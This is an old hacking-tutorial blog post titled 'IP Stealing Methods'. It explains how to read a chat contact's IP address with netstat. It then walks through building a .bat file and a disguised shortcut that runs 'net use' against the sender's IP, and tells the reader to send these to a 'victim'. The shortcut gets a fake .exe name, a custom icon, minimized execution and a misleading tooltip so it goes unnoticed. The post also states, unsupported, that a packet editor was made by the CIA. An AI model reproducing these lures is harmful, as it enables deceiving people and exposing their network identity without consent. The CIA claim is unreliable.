<div class='post hentry'>
<a name='4952578101811170203'></a>
<h3 class='post-title entry-title'>
<a href='http://djbiz89.blogspot.ru/2008/02/ip-stealing-methods.html'>IP Stealing Methods</a>
</h3>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<p><ul><li>MSN/Windows Live Messenger</li></ul>This is so simple, where as most people just say open CMD and ect...<br />Hear is a better way to insure you will get the right ip address.<br /><ol><li>Make sure you have no conversations currently open.</li><li>Open taskmanager via ctrl+alt+del.</li><li>Goto View/Select Columns.</li><li>A windows will appear, Tick PID (Process Identifier).</li><li>Then open command prompt, Start/Run &amp; type: cmd &amp; press enter.</li><li>Now type the following command into command prompt: netstat -no.</li></ol>Results: (I have replaced all ip addresses and ports apart from msnmsgr.exe with x)<br />C:\Documents and Settings\Username>netstat -no<br /><br />Active Connections<br /><br />Proto  Local Address          Foreign Address        State           PID<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     1640<br />TCP    x.x.x.x:x                    x.x.x.x:x        TIME_WAIT       0<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     2864<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      1432<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     2756<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     2756<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     2756<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     2756<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      1432<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        CLOSE_WAIT      4<br />TCP    x.x.x.x:x                    x.x.x.x:x        ESTABLISHED     1640<br />TCP x.x.x.x:x                    x.x.x.x:x  67.204.15.213:1607     ESTABLISHED     2864<br />TCP x.x.x.x:x                    x.x.x.x:x   72.139.109.125:49401   ESTABLISHED     2864<br /><br />Remember those 2 ip addresses are natural connections, any other ports with<br />that ID are conversations &amp; Proxy.<br /><br /><ul><li>Bat Files &amp; EXE</li></ul>Ok lets 1st focus on Batch Files AKA .Bat Dos Application, These files can be<br />writen with Microsoft Windows notebad.<br /><ol><li>Open Microsoft Windows notepad.</li><li>Next type the following command: net use \\YourIpHear\ipc$ "" /u:"".</li><li>Now Goto File/Save as.. &amp; Save the file as whatever you want &amp; .bat.</li><li>Send the file to a victim.</li><li>Now once you know the Victim has opened the file, Open Command Prompt via cmd &amp; type: netstat -no Or net use<br /></li></ol><ul><li>Net Use</li></ul>This will display the Victims Ip Address and \445 which is the port there machine is using.<br /><ul><li>Netstat -no</li></ul>This will show all current connections on your computer &amp; PID, Simply look for an ip like this:<br />255.255.255.255\445 the 255/255/255/255 will be replaced b the Victims Ip Address<br />and 445 again will be the port there machine is using.<br /><br /><span style="font-style: italic;">Any applications you see on the internet with the title IP Stealer that say to<br />open it and give someone the following link: yourip=x > http://x.x.x.x<br />all your are doing is giving your <span class="blsp-spelling-error" id="SPELLING_ERROR_0">ip</span> address out without thinking.<br /><br />Also you should know this will not work, a program simply listening on port 80(http-https)<br />will not work because of <span class="blsp-spelling-corrected" id="SPELLING_ERROR_1">Internet</span> &amp; windows security.<br /><br /><span style="color: rgb(204, 0, 0);">IMPORTANT!!! Before opening a file like these or any hack tool from the </span><span style="color: rgb(204, 0, 0);" class="blsp-spelling-corrected" id="SPELLING_ERROR_2">Internet</span><br /><span style="color: rgb(204, 0, 0);">scan it 1st, because allot of hack tools have </span><span style="color: rgb(204, 0, 0);" class="blsp-spelling-corrected" id="SPELLING_ERROR_3">Backdoor</span><span style="color: rgb(204, 0, 0);">s in them, a </span><span style="color: rgb(204, 0, 0);" class="blsp-spelling-corrected" id="SPELLING_ERROR_4">Backdoor</span><span style="color: rgb(204, 0, 0);"> is a </span><span style="color: rgb(204, 0, 0);" class="blsp-spelling-corrected" id="SPELLING_ERROR_5">Trojan</span><br /><span style="color: rgb(204, 0, 0);">of sorts and if the Author of the application connects to your computer your in for</span><br /><span style="color: rgb(204, 0, 0);">a world of Windows Pain. </span>I <span class="blsp-spelling-corrected" id="SPELLING_ERROR_6">Recommend <a href="http://virustotal.com/">VirusTotal</a><br /><br />Ok hear is a really good way to get a Victims Ip Address.<br /><br /></span></span><ol><li>Right click on your desktop &amp; click New/Shortcut.</li><li>A windows will appear, Type: net use \\YourIpHear\ipc$ "" /u:"".</li><li>Click next.</li><li>Use any name you want for the shortcut but put .exe on the end, Click Finish.</li><li>Right click the new shortcut &amp; goto Properties.</li><li>Click Change Icon, Choose the Icon you want. (You can also use custom icons)<br /></li><li>Goto the Shortcut Tab &amp; make the information like this:</li></ol>Start in: %windir%<br />Run: Minimized<br />Comments: What u want ToolTip to show when the Victim moves his/her mouse over<br />the shortcut.<br /><br />And Click OK.<br /><br /><span style="font-style: italic;">You now have an Ip Stealer, this works the same as the .BAT file but it is more<br />appealing to the Victim by far looking like an application with nothing but<br />a Windows Shell Command so it wont be detected, Also having a ToolTip<br />that also doesn't give it away that the file is a shortcut.<br /></span><span style="font-style: italic;"><span class="blsp-spelling-corrected" id="SPELLING_ERROR_6"><br /><br />Also remember that not all detected application are virus/worm/trojan(s)<br />An example is Winsock Packet Editor Pro, this application is detected as<br /></span></span><a style="font-style: italic;" href="http://www.virustotal.com/analisis/dea58d9ead69205df7106066d2aef718">Sniffer.Win32.WpePro.</a><br /><br />You must also know that Wpe was apprently created by the CIA to spy on<br />hackers &amp; hacker activities.<br /><br />I hope this post was helpful.</p>
